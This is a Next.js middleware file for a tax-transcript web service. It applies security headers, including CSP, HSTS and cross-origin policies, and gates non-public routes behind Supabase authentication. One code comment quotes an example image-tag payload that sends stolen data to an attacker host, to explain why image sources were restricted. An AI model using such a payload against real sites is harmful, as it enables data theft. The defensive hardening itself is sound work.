import { createServerClient } from '@supabase/ssr';
import { NextRequest, NextResponse } from 'next/server';

/**
 * SOC 2 Compliant Security Headers
 * Applied to every response via middleware
 */
function applySecurityHeaders(response: NextResponse): NextResponse {
  // Prevent clickjacking
  response.headers.set('X-Frame-Options', 'DENY');

  // Prevent MIME type sniffing
  response.headers.set('X-Content-Type-Options', 'nosniff');

  // X-XSS-Protection intentionally NOT set — the header is legacy, ignored
  // by modern browsers (Chrome removed support in 78), and can actually
  // INTRODUCE XSS vectors in old IE/Edge through buggy reflective-filter
  // implementations. CSP is the modern defense (audit L1).

  // Strict Transport Security (HSTS) — enforce HTTPS, 1 year
  response.headers.set(
    'Strict-Transport-Security',
    'max-age=31536000; includeSubDomains; preload'
  );

  // Referrer Policy — don't leak sensitive URLs
  response.headers.set('Referrer-Policy', 'strict-origin-when-cross-origin');

  // Permissions Policy — restrict sensitive browser APIs
  response.headers.set(
    'Permissions-Policy',
    'camera=(), microphone=(), geolocation=(), payment=()'
  );

  // SOC 2 CC6.6 — cross-origin isolation headers (audit M2).
  // COOP=same-origin closes window.opener attacks. CORP=same-origin blocks
  // cross-origin <img>/<script>/<link> embeds. COEP=require-corp is NOT set
  // because it breaks Supabase storage signed-URL image loads — revisit
  // when storage URLs are served from a CORP-tagged endpoint.
  response.headers.set('Cross-Origin-Opener-Policy', 'same-origin');
  response.headers.set('Cross-Origin-Resource-Policy', 'same-origin');

  // Content Security Policy — restrict content sources
  // .trim() prevents trailing newlines from env vars breaking Edge Runtime headers
  const supabaseUrl = (process.env.NEXT_PUBLIC_SUPABASE_URL || '').trim();

  // SOC 2 C1.1 — img-src tightened from `https:` (any HTTPS image) to a
  // specific allowlist (audit L3). The prior `https:` permitted any HTTPS
  // image, which could be abused as a data-exfiltration channel via
  // <img src="https://attacker.com/?stolen=...">. Allowlist covers our
  // CDN, Supabase storage, and Mercury/Stripe (logos in receipts).
  const imgSrcAllowlist = [
    "'self'",
    'data:',
    'blob:',
    'https://cdn.moderntax.io',
    supabaseUrl,
    'https://*.supabase.co',
    'https://files.stripe.com',
    'https://b.stripecdn.com',
  ].filter(Boolean).join(' ');

  const cspDirectives = [
    "default-src 'self'",
    "script-src 'self' 'unsafe-inline' 'unsafe-eval'",
    "style-src 'self' 'unsafe-inline'",
    `connect-src 'self' ${supabaseUrl} https://*.supabase.co wss://*.supabase.co`,
    `img-src ${imgSrcAllowlist}`,
    "font-src 'self' data:",
    "object-src 'none'",
    "worker-src 'self' blob:",
    "frame-ancestors 'none'",
    "base-uri 'self'",
    "form-action 'self'",
  ];

  // Ensure no newlines in header value (Edge Runtime rejects them)
  const cspValue = cspDirectives.join('; ').replace(/[\r\n]/g, ' ');
  response.headers.set('Content-Security-Policy', cspValue);

  // Prevent caching of sensitive pages
  response.headers.set('Cache-Control', 'no-store, no-cache, must-revalidate, private');
  response.headers.set('Pragma', 'no-cache');

  return response;
}

export async function middleware(request: NextRequest) {
  let supabaseResponse = NextResponse.next({
    request,
  });

  const supabase = createServerClient(
    process.env.NEXT_PUBLIC_SUPABASE_URL || '',
    process.env.NEXT_PUBLIC_SUPABASE_ANON_KEY || '',
    {
      cookies: {
        getAll() {
          return request.cookies.getAll();
        },
        setAll(cookiesToSet) {
          cookiesToSet.forEach(({ name, value }) =>
            request.cookies.set(name, value)
          );
          supabaseResponse = NextResponse.next({
            request,
          });
          cookiesToSet.forEach(({ name, value, options }) =>
            supabaseResponse.cookies.set(name, value, {
              ...options,
              // SOC 2: Enforce secure cookie flags
              // NOTE: httpOnly must NOT be overridden to true here.
              // @supabase/ssr's createBrowserClient reads cookies via document.cookie,
              // which requires httpOnly=false. The library sets this by default.
              // CSP headers mitigate XSS risks that httpOnly would address.
              secure: process.env.NODE_ENV === 'production',
              sameSite: 'lax',
            })
          );
        },
      },
    }
  );

  // IMPORTANT: Do not use getSession() — use getUser() for security
  // This also refreshes the session cookie if needed
  const {
    data: { user },
  } = await supabase.auth.getUser();

  // If no user and not on public pages, redirect to login.
  //
  // Public surfaces (no auth required): auth flows, API routes (do their
  // own auth), share-link resolvers, and the marketing/tour surfaces:
  //   /sample-request, /sample-transcripts/* (the prospect demo + ERC
  //     report sample we link from outbound emails)
  //   /plans (pricing — linked from sample tour CTAs)
  //   /docs and /docs/* (public API reference)
  //   /status (live IRS PPS status board)
  //   /sample (legacy alias)
  const PUBLIC_PREFIXES = [
    '/login',
    '/signup',
    '/auth',
    '/forgot-password',
    '/reset-password',
    '/api/',
    '/resolve/',
    '/sample-request',
    '/sample-transcripts',
    '/sample',
    '/plans',
    '/docs',
    '/status',
    '/welcome',         // post-payment landing for self-serve buyers (no portal account yet)
    '/erc-status',      // merchant-facing ERC refund recovery status (token-gated in page)
    '/erc-reissue',     // merchant-facing ERC reissue intake + tracking (token-gated in page)
    '/intake/',         // no-login filing-intake form for Direct taxpayers (token-gated in page)
  ];
  const isPublic = PUBLIC_PREFIXES.some(p => request.nextUrl.pathname.startsWith(p));
  if (!user && !isPublic) {
    const url = request.nextUrl.clone();
    url.pathname = '/login';
    const redirectResponse = NextResponse.redirect(url);
    return applySecurityHeaders(redirectResponse);
  }

  // Apply SOC 2 security headers to all responses
  return applySecurityHeaders(supabaseResponse);
}

export const config = {
  matcher: [
    /*
     * Match all request paths except for the ones starting with:
     * - _next/static (static files)
     * - _next/image (image optimization files)
     * - favicon.ico (favicon file)
     */
    '/((?!_next/static|_next/image|favicon.ico|irs-batch-v6\\.js|.*\\.(?:svg|png|jpg|jpeg|gif|webp)$).*)',
  ],
};
